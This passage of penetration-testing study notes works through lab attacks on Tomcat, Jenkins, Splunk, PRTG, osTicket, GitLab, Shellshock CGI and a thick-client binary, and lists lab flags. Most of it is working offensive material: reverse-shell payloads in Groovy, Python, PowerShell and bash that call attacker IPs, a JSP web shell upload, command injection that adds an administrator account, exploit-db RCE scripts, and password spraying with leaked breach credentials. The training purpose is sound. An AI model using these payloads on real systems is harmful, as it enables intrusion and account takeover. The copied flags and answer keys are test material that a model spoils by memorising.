    - misconfiguration in the AJP protocol used by Tomcat.
  - nmap -sV -p 8009,8080 app-dev.inlanefreight.local
    - 8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)  
      8080/tcp open  http    Apache Tomcat 9.0.30
      - PoC code
        - https://web.archive.org/web/20260130182638/https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi
          - The exploit can only read files and folders within the web apps folder
            - /etc/passwd can’t be accessed
        - python2.7 tomcat-ajp.lfi.py app-dev.inlanefreight.local -p 8009 -f WEB-INF/web.xml
          - <display-name>Welcome to Tomcat</display-name>  
            ...
            - we may be able to access sensitive data within the WEB-INF file.
- LAB
  - Perform a login bruteforcing attack against Tomcat manager at http://web01.inlanefreight.local:8180. What is the valid username?
    - auxiliary/scanner/http/tomcat_mgr_login
      - tomcat:root
      - admin:admin
  - What is the password?
    - root
  - Obtain remote code execution on the http://web01.inlanefreight.local:8180 Tomcat instance. Find and submit the contents of tomcat_flag.txt
    - version 10 not affected by ghostcat
    - Upload WAR
      - wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
        - zip -r backup.war cmd.jsp
      - deploy
      - curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id
        - uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
        - look for /webapps/
          - curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=cat%20/opt/tomcat/apache-tomcat-10.0.10/webapps/tomcat_flag.txt
            - t0mcat_rc3_ftw!
### Attacking Tomcat CGI

- critical security issue
  - CVE-2019-0232
    - affects Windows systems
      - enableCmdLineArguments feature enabled
    - Versions
      - 9.0.0.M1 to 9.0.17, 8.5.0 to 8.5.39, and 7.0.0 to 7.0.93
- Enumeration
  - nmap -p- -sC -Pn 10.129.204.227 --open
    - 8080/tcp  open  http-proxy  
      |_http-title: Apache Tomcat/9.0.17
  - Finding a CGI script
    - ffuf
      - ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.cmd
      - ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.bat
        - welcome
- Exploitation
  - http://10.129.204.227:8080/cgi/welcome.bat?&dir
    - returns the output for the dir
  - whoami doesn't return an output.
    - set
      - Retrieve a list of environmental variables
      - http://10.129.204.227:8080/cgi/welcome.bat?&c:\windows\system32\whoami.exe
        - error message indicating that an invalid character
      - the filter can be bypassed by URL-encoding the payload.
        - http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
- LAB
  - After running the URL Encoded 'whoami' payload, what user is tomcat running as?
    - nmap 10.129.205.30 -sC -Pn --open
      - 8080/tcp open  http-proxy  
        |_http-open-proxy: Proxy might be redirecting requests  
        |_http-favicon: Apache Tomcat  
        |_http-title: Apache Tomcat/9.0.17
    - ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.205.30:8080/cgi/FUZZ.bat
      - welcome
    - curl 'http://10.129.205.30:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe'
      - Welcome to CGI, this section is not functional yet. Please return to home page.  
        feldspar\omen
## Part 2

### Jenkins - Discovery & Enumeration

- Discovery/Footprinting
  - Jenkins runs on Tomcat port 8080 by default.
    - utilizes port 5000 to attach slave servers.
- Enumeration
  - http://jenkins.inlanefreight.local:8000/login?from=%2F
    - Welcome to Jenkins
  - We may encounter a Jenkins instance that uses weak or default credentials
    - admin:admin
  - or does not have any type of authentication enabled
    - not uncommon
      - during an internal penetration test.
- LAB
  - Log in to the Jenkins instance at http://jenkins.inlanefreight.local:8000. Browse around and submit the version number when you are ready to move on.
    - Login -> View Page Source
      - 2.303.1
### Attacking Jenkins

- Script Console
  - /script
    - run Apache Groovy scripts
      - <https://en.wikipedia.org/wiki/Apache_Groovy>
        - can run on any platform that has JRE installed.
      - functioning similarly to a web shell
        - def cmd = 'id'  
          def sout = new StringBuffer(), serr = new StringBuffer()  
          def proc = cmd.execute()  
          proc.consumeProcessOutput(sout, serr)  
          proc.waitForOrKill(1000)  
          println sout
          - uid=0(root) gid=0(root) groups=0(root)
        - nc -lvnp 8443 before it
          - r = Runtime.getRuntime()  
            p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.2/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])  
            p.waitFor()
            - id
              - uid=0(root) gid=0(root) groups=0(root)
                - /bin/bash -i
                  - /var/lib/jenkins3#
      - Metasploit module.
        - <https://web.archive.org/web/20230326230234/https://www.rapid7.com/db/modules/exploit/multi/http/jenkins_script_console/>
    - Against a Windows host we can do
      - add a user and connect to the host via RDP or WinRM
      - use a PowerShell download cradle with Invoke-PowerShellTcp.ps1.
        - <https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1>
      - We could run commands on a Windows-based Jenkins install using this snippet
        - def cmd = "cmd.exe /c dir".execute();  
          println("${cmd.text}");
      - Java reverse shell
        - <https://gist.githubusercontent.com/frohoff/fed1ffaab9b9beeb1c76/raw/7cfa97c7dc65e2275abfb378101a505bfb754a95/revsh.groovy>
          - String host="localhost";  
            int port=8044;  
            String cmd="cmd.exe";  
            Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
- Miscellaneous Vulnerabilities
  - pre-authenticated remote code execution
    - <https://jenkins.io/security/advisory/2019-01-08/#SECURITY-1266>
      - This exploit works against Jenkins version 2.137.
    - or
      - CVE-2018-1999002
    - Another vulnerability exists in Jenkins 2.150.2
- LAB
  - Attack the Jenkins target and gain remote code execution. Submit the contents of the flag.txt file in the /var/lib/jenkins3 directory
    - login as
      - admin:admin
        - View Page Source
          - Jenkins 2.303.1
            - the current LTS release of Jenkins is 2.303.1, then look for script to get RCE
    - prepare RCE
      - nc -nvlp 8443
      - write the script in /script
        - r = Runtime.getRuntime()  
          p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.2/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])  
          p.waitFor()
          - on nc we get  
            Connection received on 10.129.201.58 58250
            - id
              - uid=0(root) gid=0(root) groups=0(root)
                - cat /var/lib/jenkins3/flag.txt
                  - f33ling_gr00000vy!
### Splunk - Discovery & Enumeration

- vulnerability
  - information disclosure vulnerability (CVE-2018-11409)
  - authenticated remote code execution vulnerability in very old versions (CVE-2011-4642)
  - unauthorized access to the Splunk REST API
    - <https://www.exploit-db.com/exploits/40895>
      - SSRF
  - CVEs
    - <https://www.cvedetails.com/vulnerability-list/vendor_id-10963/Splunk.html>
- Discovery/Footprinting
  - sudo nmap -sV 10.129.201.50
    - 8000/tcp open  ssl/http      Splunkd httpd
      - runs by default on port 8000
  - On older versions of Splunk, the default credential
    - admin:changeme
  - The latest version
    - worth checking for common weak passwords
      - admin, Welcome, Welcome1, Password123, et
- Enumeration
  - logged in
    - /en-US/app/launcher/home
  - running code
    - server-side Django applications
    - REST endpoints, scripted inputs
      - run Bash, PowerShell, or Batch scripts
    - alerting scripts
- LAB
  - Enumerate the Splunk instance as an unauthenticated user. Submit the version number to move on (format 1.2.3).
    - https://10.129.201.50:8000
      - 8.2.2
        - on HTTP title
### Attacking Splunk

- Abusing Built-In Functionality
  - Splunk package to assist us
    - <https://github.com/0xjpuff/reverse_shell_splunk>
      - <https://github.com/0xjpuff/reverse_shell_splunk/blob/master/reverse_shell_splunk/bin/rev.py>
        - If we were dealing with a Linux host
          - import sys,socket,os,pty  
            ip="10.10.14.15"  
            port="443"  
            s=socket.socket()  
            s.connect((ip,int(port)))  
            [os.dup2(s.fileno(),fd) for fd in (0,1,2)]  
            pty.spawn('/bin/bash')
      - <https://github.com/0xjpuff/reverse_shell_splunk/blob/master/reverse_shell_splunk/bin/run.ps1>
        - inputs.conf
        - $client = New-Object System.Net.Sockets.TCPClient('10.10.14.15',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
      - We need the .bat file, which will run when the application is deployed and execute the PowerShell one-liner.
        - @ECHO OFF  
          PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"  
          Exit
    - create a tarball or .spl file.
      - tar -cvzf updater.tar.gz splunk_shell/
        - splunk_shell/  
          splunk_shell/bin/  
          splunk_shell/bin/rev.py  
          splunk_shell/bin/run.bat  
          splunk_shell/bin/run.ps1  
          splunk_shell/default/  
          splunk_shell/default/inputs.conf
  - sudo nc -lnvp 443
    - or
      - <https://linux.die.net/man/1/socat>
  - choose Install app from file and upload the application
    - /en-US/manager/search/apps/local
      - click on browse
        - choose the tarball we created earlier and click Upload.
          - whoami
            - nt authority\system
    - To push a reverse shell out to other hosts
      - application must be placed in the $SPLUNK_HOME/etc/deployment-apps
  - LAB
    - Attack the Splunk target and gain remote code execution. Submit the contents of the flag.txt file in the c:\loot directory.
      - git clone https://github.com/0xjpuff/reverse_shell_splunk.git
        - cd /reverse_shell_splunk/reverse_shell_splunk/bin
          - modify run.ps1
            - put our IP:port
        - cd /reverse_shell_splunk/
          - tar -cvzf updater.tar.gz reverse_shell_splunk/
            - tree
              - .  
                ├── README.md  
                ├── reverse_shell_splunk  
                │   ├── bin  
                │   │   ├── rev.py  
                │   │   ├── run.bat  
                │   │   └── run.ps1  
                │   └── default  
                │       └── inputs.conf  
                └── updater.tar.gz
      - sudo -nvlp 443
      - visit /en-US/manager/search/apps/local
        - upload /reverse_shell_splunk/updater.tar.gz
      - Connection received on 10.129.201.50 51831
        - cat /loot/flag.txt
          - l00k_ma_no_AutH!
### PRTG Network Monitor

- agentless network monitor software
  - It is rare to see PRTG exposed externally
- suffered from 26 vulnerabilities
  - <https://www.cvedetails.com/vulnerability-list/vendor_id-5034/product_id-35656/Paessler-Prtg-Network-Monitor.html>
    - only four have easy-to-find public exploit PoCs
      - two cross-site scripting (XSS)
      - one Denial of Service
      - authenticated command injection
- Discovery/Footprinting/Enumeration
  - found on common web ports such as 80, 443, or 8080
    - sudo nmap -sV -p- --open -T4 10.129.201.50
      - 8080/tcp  open  http          Indy httpd 17.3.33.2830 (Paessler PRTG bandwidth monitor)
        - likely vulnerable to CVE-2018-9276
          - <https://nvd.nist.gov/vuln/detail/CVE-2018-9276>
        - before version 18.2.39
  - cURL
    - curl -s http://10.129.201.50:8080/index.htm -A "Mozilla/5.0 (compatible;  MSIE 7.01; Windows NT 5.0)" | grep version
      - <span class="prtgversion">&nbsp;PRTG Network Monitor 17.3.33.2830 </span>
  - EyeWitness
    - PRTG also shows up in the EyeWitness scan we performed earlier.
    - EyeWitness lists the default credentials
      - /index.htm
        - prtgadmin:prtgadmin
          - Our first attempt to log in with the default credentials fails,
          - but a few tries later, we are in with prtgadmin:Password123.
  - Nessus
    - <https://www.tenable.com/plugins/nessus/51874>
      - detect the presence of PRTG.
- Leveraging Known Vulnerabilities
  - likely vulnerable to a command injection flaw
    - This excellent blog post
      - <https://www.codewatch.org/blog/?p=453>
  - When creating a new notification
    - the Parameter field is passed directly into a PowerShell script without any type of input sanitization.
  - To begin
    - /myaccount.htm?tabid=2
      - mouse over Setup
        - Account Settings menu and finally click on Notifications.
          - Add new notification
    - EXECUTE PROGRAM. Under Program File
      - select Demo exe notification - outfile.ps1
    - Finally, in the parameter field, enter a command
      - test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add
        - After clicking Save
          - redirected to the Notifications page and see our new notification in the list.
            - click the Test notification button on the right to run our notification
              - EXE notification is queued up
  - see if we can authenticate to the host as a local admin
    - CrackMapExec
      - sudo crackmapexec smb 10.129.201.50 -u prtgadm1 -p Pwn3d_by_PRTG!
- LAB
  - What version of PRTG is running on the target?
    - sudo nmap -sV -p 8080 --open -T4 10.129.201.50
      - 8080/tcp open  http    Indy httpd 18.1.37.13946
  - Attack the PRTG target and gain remote code execution. Submit the contents of the flag.txt file on the administrator Desktop.
    - login with
      - prtgadmin:Password123
        - /myaccount.htm?tabid=2
          - Mouse on Setup > Add Notification
            - in the parameter field, enter a command
              - test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add
                - clicking Save
                  - click the Test notification button on the right to run our notification
                    - EXE notification is queued up
    - evil-winrm -i 10.129.201.50 -u prtgadm1 -p Pwn3d_by_PRTG!
      - Evil-WinRM PS C:\Users\prtgadm1\Documents>
        - cat /users/administrator/desktop/flag.txt
          - WhOs3_m0nit0ring_wH0?
### osTicket

- <https://osticket.com/>
- Footprinting/Discovery/Enumeration
  - EyeWitness
    - screenshot of an osTicket instance which also shows that a cookie named OSTSESSID
  - powered by in front of it in the page's footer.
- CVEs
  - <https://www.cvedetails.com/vendor/2292/Osticket.html>
- Attacking osTicket
  - exploit-db
    - <https://nvd.nist.gov/vuln/detail/CVE-2020-24881>
      - on osTicket version 1.14.1
  - web application-related vulnerabilities
    - support portals can sometimes be used to obtain an email address for a company domain
      - sign up for other exposed applications requiring an email verification to be sent
        - HTB weekly release box Delivery
          - <https://0xdf.gitlab.io/2021/05/22/htb-delivery.html>
          - <https://www.youtube.com/watch?v=gbs43E71mFM>
    - quick example (custom)
      - <https://medium.com/intigriti/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c>
      - we come across a customer support portal
        - submit a new ticket,
          - If you want to add more information to your ticket,just email 940288@inlanefreight.local.
            - If the company set up their helpdesk software to correlate ticket numbers with emails
      - find an external portal
        - Wiki
        - Slack
        - Git
      - register an account
        - use this email to register
  - osTicket - Sensitive Data Exposure
    - we discover several user credentials using the tool Dehashed
      - we are on an external penetration test. During our OSINT and information gathering
        - <http://dehashed.com/>
          - sudo python3 dehashed.py -q inlanefreight.local -p
            - id : 5996447501  
              email : julie.clayton@inlanefreight.local  
              username : jclayton  
              password : JulieC8765!  
              hashed_password :  
              name : Julie Clayton  
              vin :  
              address :  
              phone :  
              database_name : ModBSolutions  
              id : 7344467234  
              email : kevin@inlanefreight.local  
              username : kgrimes  
              password : Fish1ng_s3ason!  
              hashed_password :  
              name : Kevin Grimes  
              vin :  
              address :  
              phone :  
              database_name : MyFitnessPal
              - This dump shows cleartext passwords for two different users
                - jclayton
                - kgrimes
    - we have also performed subdomain enumeration
      - cat ilfreight_subdomains
        - vpn.inlanefreight.local  
          support.inlanefreight.local  
          ns1.inlanefreight.local  
          mail.inlanefreight.local  
          apps.inlanefreight.local  
          ftp.inlanefreight.local  
          dev.inlanefreight.local  
          ir.inlanefreight.local  
          auth.inlanefreight.local  
          careers.inlanefreight.local  
          portal-stage.inlanefreight.local  
          dns1.inlanefreight.local  
          dns2.inlanefreight.local  
          meet.inlanefreight.local  
          portal-test.inlanefreight.local  
          home.inlanefreight.local  
          legacy.inlanefreight.local
          - active and very promising
            - Support.inlanefreight.local
              - osTicket instance
            - vpn.inlanefreight.local
              - Barracuda SSL VPN web portal
                - does not appear to be using multi-factor authentication.
    - try the credentials
      - kgrimes and have no success but noticing that the login page also accepts an email address
        - kevin@inlanefreight.local and get a successful login!
    - Digging around a bit
      - we find one closed ticket
        - The agent then commits an error and sends the password to the user directly via the portal
    - create a user list of company
      - <https://github.com/initstring/linkedin2username>
        - attempt a password spraying attack against the VPN endpoint with this standard password.
          - welcome
          - password
          - the company name
          - seasons and months
- LAB
  - Find your way into the osTicket instance and submit the password sent from the Customer Support Agent to the customer Charles Smithson.
    - sign in as agent
      - use the credentials above
        - kevin@inlanefreight.local:Fish1ng_s3ason!
    - we saw VPN Password reset ticket
      - Inlane_welcome!
### Gitlab - Discovery & Enumeration

- Intro
  - web-based Git-repository hosting tool that provides wiki capabilities, issue tracking, and continuous integration and deployment pipeline functionality.
  - public repositories (that require no authentication)
  - private repositories (restricted to specific users)
  - Most companies will only allow a user with a company email address to register and require an administrator to authorize the account
  - If we can obtain user credentials from our OSINT
    - we may be able to log in to a GitLab instance
      - Two-factor authentication is disabled by default.
- Footprinting & Discovery
  - browsing to the GitLab URL
    - /users/sign_in
      - GitLab
  - version number
    - /help
  - try a low-risk exploit
    - <https://www.exploit-db.com/exploits/49821>
  - serious exploits against GitLab
    - <https://www.exploit-db.com/exploits/48431>
      - 12.9.0
    - <https://www.exploit-db.com/exploits/49257>
      - 11.4.7
    - Community Edition
      - <https://www.exploit-db.com/exploits/49821>
        - 13.10.3
      - <https://www.exploit-db.com/exploits/49944>
        - 13.9.3
      - <https://www.exploit-db.com/exploits/49951>
        - 13.10.2
- Enumeration
  - There's not much we can do against GitLab without knowing the version number or being logged in
  - browsing to /explore
    - see if there are any public projects that may contain something interesting.
      - project called Inlanefreight dev
        - we may be able to use them to find out more about the company's infrastructure, find production code
          - find a bug in after a code review
          - hard-coded credentials
          - script or configuration file containing credentials
          - SSH private key or API key.
  - Browsing to the project
    - we can explore each of the pages linked in the top left groups, snippets, and help.
  - Users enumerations
    - /users/sign_up
      - registration
    - attempt to guess weak passwords
    - re-use credentials that we find from a password dump using a tool such as Dehashed
  - register with the credentials
    - hacker:Welcome
      - go to the /explore page
        - internal project Inlanefreight website available to us
          - we could possibly download the source and review it for vulnerabilities or hidden functionality or find credentials or other sensitive data.
- LAB
  - Enumerate the GitLab instance at http://gitlab.inlanefreight.local. What is the version number?
    - /help
      - 13.10.2
  - Find the PostgreSQL database password in the example project.
    - register
      - username: hacker1  
        email: a@a.c  
        password: Welcome1
    - invistigate public projects > All
      - inlanefreight-dev / phpunit_pgsql.xml
        - <var name="db_password" value="postgres"/>
### Attacking GitLab

- <https://www.cvedetails.com/vulnerability-list/vendor_id-13074/Gitlab.html>
- Username Enumeration
  - Bash or Python
  - <https://www.exploit-db.com/exploits/49821>
    - Python3 version
      - <https://github.com/dpgg101/GitLabUserEnum>
  - 16.6, GitLab's
    - 10 failed login attempts, resulting in an automatic unlock after 10 minutes.
  - Downloading the script and running it
    - ./gitlab_userenum.sh --url http://gitlab.inlanefreight.local:8081/ --userlist users.txt
      - [+] The username root exists!  
        [+] The username bob exists!
- Authenticated Remote Code Execution
  - GitLab Community Edition version 13.10.2
    - <https://hackerone.com/reports/1154542>
  - exploit to achieve RCE.
    - <https://www.exploit-db.com/exploits/49951>
      - nc -lnvp 8443
      - python3 gitlab_13_10_2_rce.py -t http://gitlab.inlanefreight.local:8081 -u mrb3n -p password1 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.15 8443 >/tmp/f '
        - connect to [10.10.14.15] from (UNKNOWN) [10.129.201.88] 60054
          - id
            - uid=996(git) gid=997(git) groups=997(git)
- LAB
  - Find another valid user on the target GitLab instance.
    - git clone https://github.com/dpgg101/GitLabUserEnum.git
      - python gitlab_userenum.py --url http://gitlab.inlanefreight.local:8081/ --wordlist /opt/useful/seclists/Usernames/xato-net-10-million-usernames.txt
        - [+] The username demo exists!
  - Gain remote code execution on the GitLab instance. Submit the flag in the directory you land in.
    - <https://www.exploit-db.com/exploits/49951>
      - nc -lnvp 8443
      - python3 49951.py -t http://gitlab.inlanefreight.local:8081 -u mrb3n -p password1 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.2 8443 >/tmp/f '
        - git@app04:~/gitlab-workhorse$
          - cat flag_gitlab.txt
            - s3cure_y0ur_Rep0s!
### Attacking Common Gateway Interface (CGI) Applications - Shellshock

- middleware between web servers, external databases, and information sources
  - /CGI-bin
- CGI Attacks
  - Shellshock
    - <https://nvd.nist.gov/vuln/detail/CVE-2014-6271>
      - flaw in the Bash shell (GNU Bash up until version 4.3)
    - Shellshock via CGI
      - $ env y='() { :;}; echo vulnerable-shellshock' bash -c "echo not vulnerable"
        - If the system is not vulnerable, only "not vulnerable" will be printed.
- Enumeration
  - gobuster dir -u http://10.129.204.231/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
    - /access.cgi
  - curl -i http://10.129.204.231/cgi-bin/access.cgi
    - nothing is output to us
  - Confirming the Vulnerability
    - curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.129.204.231/cgi-bin/access.cgi
      - root:x:...
- Exploitation to Reverse Shell Access
  - sudo nc -lvnp 7777
  - curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' http://10.129.204.231/cgi-bin/access.cgi
  - id
    - uid=33(www-data) gid=33(www-data) groups=33(www-data)
- Mitigation
  - <https://www.digitalocean.com/community/tutorials/how-to-protect-your-server-against-the-shellshock-bash-vulnerability>
- LAB
  - Enumerate the host, exploit the Shellshock vulnerability, and submit the contents of the flag.txt file located on the server.
    - gobuster dir -u http://10.129.204.231/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
      - /access.cgi
    - sudo nc -lvnp 7777
      - curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.2/7777 0>&1' http://10.129.204.231/cgi-bin/access.cgi
        - cat flag.txt
          - Sh3ll_Sh0cK_123
### Attacking Thick Client Applications

- applications do not require internet access to run
- characteristics of thick client applications are:
  - Independent software.
  - Working without internet access.
  - Storing data locally.
  - Less secure.
  - Consuming more resources.
  - More expensive.
- thick client applications are considered less secure than web applications with many attacks
  - Improper Error Handling.
  - Hardcoded sensitive data.
  - DLL Hijacking.
  - Buffer Overflow.
  - SQL Injection.
  - Insecure Storage.
  - Session Management.
- Penetration Testing Steps
  - Information Gathering
  - Client Side attacks
    - command injection, weak access control, and SQL injection.
    - reverse-engineer
      - Dynamic analysis
        - Ghidra	IDA	OllyDbg	Radare2  
          dnSpy	x64dbg	JADX	Frida
  - Network Side Attacks
    - HTTP/HTTPS or TCP/UDP
      - Wireshark	tcpdump	TCPView	Burp Suite
  - Server Side Attacks
    - OWASP Top Ten.
- Retrieving hardcoded Credentials from Thick-Client Applications
  - The scenario
    - Downloading the tool ProcMon64
      - <https://learn.microsoft.com/en-gb/sysinternals/downloads/procmon>
    - we have gained access to an exposed SMB service.
      - Exploring the NETLOGON share of the SMB
        - RestartOracle-Service.exe among other files. Downloading the executable locally and running it through the command line
    - .\Restart-OracleService.exe
    - ProcMon64
      - monitoring the process reveals that the executable indeed creates a temp file in C:\Users\Matt\AppData\Local\Temp.
        - In order to capture the files, it is required to change the permissions of the Temp folder to disallow file deletions
          > Properties -> Security -> Advanced -> cybervaca -> Disable inheritance -> Convert inherited permissions into explicit permissions on this object -> Edit -> Show advanced permissions, we deselect the Delete subfolders and files, and Delete
    - run again the Restart-OracleService.exe
      - 6F39.bat is created under the C:\Users\cybervaca\AppData\Local\Temp\2
        - .bat
          - @shift /0  
            @echo off  
            if %username% == matt goto correcto  
            if %username% == frankytech goto correcto  
            if %username% == ev4si0n goto correcto  
            goto error  
            :correcto  
            echo TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA > c:\programdata\oracle.txt  
            echo AAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4g >> c:\programdata\oracle.txt  
            <SNIP>  
            echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> c:\programdata\oracle.txt  
            echo $salida = $null; $fichero = (Get-Content C:\ProgramData\oracle.txt) ; foreach ($linea in $fichero) {$salida += $linea }; $salida = $salida.Replace(" ",""); [System.IO.File]::WriteAllBytes("c:\programdata\restart-service.exe", [System.Convert]::FromBase64String($salida)) > c:\programdata\monta.ps1  
            powershell.exe -exec bypass -file c:\programdata\monta.ps1  
            del c:\programdata\monta.ps1  
            del c:\programdata\oracle.txt  
            c:\programdata\restart-service.exe  
            del c:\programdata\restart-service.exe
        - Inspecting the content of the file reveals that two files are being dropped by the batch file and being deleted
          - modifying the batch script and removing the deletion.
            - modified.bat
              - @shift /0  
                @echo off  
                echo TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA > c:\programdata\oracle.txt  
                echo AAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4g >> c:\programdata\oracle.txt  
                <SNIP>  
                echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> c:\programdata\oracle.txt  
                echo $salida = $null; $fichero = (Get-Content C:\ProgramData\oracle.txt) ; foreach ($linea in $fichero) {$salida += $linea }; $salida = $salida.Replace(" ",""); [System.IO.File]::WriteAllBytes("c:\programdata\restart-service.exe", [System.Convert]::FromBase64String($salida)) > c:\programdata\monta.ps1
    - executing the batch script
      - spot the oracle.txt file which contains another file full of base64 lines
        - and the script monta.ps1
          - script simply reads the contents of the oracle.txt file and decodes it to the restart-service.exe
            - Now when executing restart-service.exe we are presented with the banner Restart Oracle created by HelpDesk back in 2010.
              - ProcMon64 shows that it is querying multiple things in the registry and does not show anything solid to go by.
    - start x64dbg
      - Options -> Preferences, and uncheck everything except Exit Breakpoint:
        - he debugging will start directly from the application's exit point
      - Then, we can select file -> open and select the restart-service.exe
        - start the debugging.
      - right click inside the CPU view and Follow in Memory Map:
        - Checking the memory maps at this stage of the execution, of particular interest is the map with a size of 0000000000003000 with a type of MAP and protection set to -RW--.
          - Memory-mapped files allow applications to access large files without having to read or write the entire file into memory at once. Instead, the file is mapped to a region of memory that the application can read and write as if it were a regular buffer in memory.
            - This could be a place to potentially look for hardcoded credentials.
              - If we double-click on it, we will see the magic bytes MZ in the ASCII column that indicates that the file is a DOS MZ executable.
    - return to the Memory Map pane
      - C:\> C:\TOOLS\Strings\strings64.exe .\restart-service_00000000001E0000.bin
        - <SNIP>  
          "#M  
          z\V  
          ).NETFramework,Version=v4.0,Profile=Client  
          FrameworkDisplayName  
          .NET Framework 4 Client Profile  
          <SNIP>
          - dump contains a .NET executable.
    - use De4Dot to reverse .NET executables back to the source code
      - Now, we can read the source code of the exported application by dragging and dropping it onto the DnSpy executable.
  - LAB
    - Perform an analysis of C:\Apps\Restart-OracleService.exe and identify the credentials hidden within its source code. Submit the answer using the format username:password.
      - Run Procmon64
        - Filter
          - Process Name to [Restart-OracleService.exe]
            - run the executable
        - Invistigate the Path of each action did by the process
          - we can see it created file in C:\Users\cybervaca\AppData\Local\Temp\2\9BF2.tmp
            - \9BF2.tmp\9BF2.bat
      - Edit permission of \Temp to prevent deletion
        - Properties -> Security -> Advanced -> cybervaca -> Disable inheritance -> Convert inherited permissions into explicit permissions on this object -> Edit -> Show advanced permissions, we deselect the Delete subfolders and files, and Delete
          - run the executable again
      - Inspect \Temp Folder
        - 2
          - B608.bat
            - del c: \programdata\monta.ps1  
              del c: \programdata\oracle.txt  
              ..  
              del c: \programdata\restart-service.exe
              - Edit and remove the deletion
                - Execute batch files
          - also 449.bat
      - Inspect \programdata\oracle.txt
        - oracle.txt
          - decode base64 in cyberchief
            - File type:   Windows Portable Executable  
              Extension:   exe,dll,drv,vxd,sys,ocx,vbx,com,fon,scr  
              MIME type:   application/vnd.microsoft.portable-executable
        - monta.ps1
          - $salida = $null; $fichero = (Get-Content C:\ProgramData\oracle.txt) ; foreach ($linea in $fichero) {$salida += $linea }; $salida = $salida.Replace(" ",""); [System.IO.File]::WriteAllBytes("c:\programdata\restart-service.exe", [System.Convert]::FromBase64String($salida))
            - run as administrator in PSH
              - restart-service.exe have been created
                - run as administrator
                  - by Helpdesk 2010
      - run x64dbg
        - options > preferense > uncheck everything except Exit Breakpoint
          - restart
        - File > open > C:\programdata\restart-service.exe
        - go to Follow in Memory Map
          - Memory-mapped (since its regular buffer in memory can be good plce to look for hardcoded credentials)
            - look for Type : MAP  
              and protection set to -RW--  
              and size 3000.
              - Right Click > Dump memory into file
                - Powershell as admin
                  - .\strings64.exe C:\TOOLS\xdgb\release\x64\restart-service_0000000000AC0000.bin
                    - <SNIP>  
                      "#M  
                      z\V  
                      ).NETFramework,Version=v4.0,Profile=Client
      - use De4Dot to reverse .NET
        - \de4dot.exe C:\TOOLS\xdgb\release\x64\restart-service_0000000000AC0000.bin
          - Saving C:\TOOLS\xdgb\release\x64\restart-service_0000000000AC0000-cleaned.bin
      - run DnsSpy to read source code
        - open file > restart-service_0000000000AC0000-cleaned.bin
          - inspect under runas
            - Main String ..
              - process.StartInfo.UserName = "svc_oracle";  
                process.StartInfo.UseShellExecute = false;  
                SecureString secureString = new SecureString();  
                string text = "#oracle_s3rV1c3!2010";
                - svc_oracle:#oracle_s3rV1c3!2010
### Exploiting Web Vulnerabilities in Thick-Client Applications

- scenario
  - enumerating an FTP server that provides anonymous user access.
    - fatty-client.jar
    - note.txt
    - note2.txt
    - note3.txt
    - Reading the content of all the text files reveals that:
      - A server has been reconfigured to run on port 1337 instead of 8000.
      - This might be a thick/thin client architecture where the client application still needs to be updated to use the new port.
      - The client application relies on Java 8.
